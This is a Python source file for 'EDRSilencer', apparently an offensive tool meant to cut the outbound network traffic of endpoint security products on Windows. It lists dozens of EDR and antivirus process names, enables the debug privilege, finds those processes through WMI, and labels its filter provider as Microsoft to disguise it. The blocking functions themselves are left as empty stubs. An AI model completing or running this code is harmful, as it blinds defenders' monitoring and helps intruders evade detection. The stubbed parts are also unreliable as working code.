import ctypes
import os
import sys
import win32api
import win32con
import win32security
from ctypes import wintypes
from win32com.client import GetObject

edr_processes = [
    "MsMpEng.exe", "MsSense.exe", "SenseIR.exe", "SenseNdr.exe", "SenseCncProxy.exe", "SenseSampleUploader.exe",
    "winlogbeat.exe", "elastic-agent.exe", "elastic-endpoint.exe", "filebeat.exe",
    "xagt.exe", "QualysAgent.exe",
    "SentinelAgent.exe", "SentinelAgentWorker.exe", "SentinelServiceHost.exe", "SentinelStaticEngine.exe",
    "LogProcessorService.exe", "SentinelStaticEngineScanner.exe", "SentinelHelperService.exe",
    "SentinelBrowserNativeHost.exe", "CylanceSvc.exe",
    "AmSvc.exe", "CrAmTray.exe", "CrsSvc.exe", "ExecutionPreventionSvc.exe", "CybereasonAV.exe",
    "cb.exe", "RepMgr.exe", "RepUtils.exe", "RepUx.exe", "RepWAV.exe", "RepWSC.exe",
    "TaniumClient.exe", "TaniumCX.exe", "TaniumDetectEngine.exe",
    "Traps.exe", "cyserver.exe", "CyveraService.exe", "CyvrFsFlt.exe",
    "fortiedr.exe", "sfc.exe", "EIConnector.exe", "ekrn.exe", "hurukai.exe",
    "CETASvc.exe", "WSCommunicator.exe", "EndpointBasecamp.exe", "TmListen.exe", "Ntrtscan.exe",
    "TmWSCSvc.exe", "PccNTMon.exe", "TMBMSRV.exe", "CNTAoSMgr.exe", "TmCCSF.exe"
]

filter_name = "Custom Outbound Filter"
provider_name = "Microsoft Corporation"
provider_description = "Microsoft Windows WFP Built-in custom provider."

in_wfp_flag = [False] * len(edr_processes)

def is_in_edr_process_list(proc_name):
    for i, edr_proc in enumerate(edr_processes):
        if proc_name.lower() == edr_proc.lower() and not in_wfp_flag[i]:
            in_wfp_flag[i] = True
            return True
    return False

def enable_se_debug_privilege():
    hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
    privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
    win32security.AdjustTokenPrivileges(hToken, 0, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])

def block_edr_process_traffic():
    enable_se_debug_privilege()
    wmi = GetObject('winmgmts:')
    processes = wmi.InstancesOf('Win32_Process')

    for process in processes:
        if is_in_edr_process_list(process.Name):
            print(f"Detected running EDR process: {process.Name} (PID: {process.ProcessId})")
            # Implement blocking logic here
            # This part depends on your specific blocking mechanism

def block_process_traffic(full_path):
    # Implement blocking logic for the specific process
    pass

def unblock_all_wfp_filters():
    # Implement logic to unblock all WFP filters
    pass

def unblock_wfp_filter(filter_id):
    # Implement logic to unblock a specific WFP filter
    pass

def print_help():
    print("Usage: EDRSilencer.py <blockedr/block/unblockall/unblock>")
    print("Version: 1.0")
    print("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:")
    print("  EDRSilencer.py blockedr")
    print("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):")
    print("  EDRSilencer.py block \"C:\\Windows\\System32\\curl.exe\"")
    print("- Remove all WFP filters applied by this tool:")
    print("  EDRSilencer.py unblockall")
    print("- Remove a specific WFP filter based on filter id:")
    print("  EDRSilencer.py unblock <filter id>")

def main():
    if len(sys.argv) < 2:
        print_help()
        return

    command = sys.argv[1].lower()

    if command in ("-h", "--help"):
        print_help()
    elif command == "blockedr":
        block_edr_process_traffic()
    elif command == "block":
        if len(sys.argv) < 3:
            print("[-] Missing second argument. Please provide the full path of the process to block.")
            return
        block_process_traffic(sys.argv[2])
    elif command == "unblockall":
        unblock_all_wfp_filters()
    elif command == "unblock":
        if len(sys.argv) < 3:
            print("[-] Missing argument for 'unblock' command. Please provide the filter id.")
            return
        try:
            filter_id = int(sys.argv[2])
            unblock_wfp_filter(filter_id)
        except ValueError:
            print("[-] Please provide filter id in digits.")
    else:
        print(f"[-] Invalid argument: \"{command}\".")
        print_help()

if __name__ == "__main__":
    main()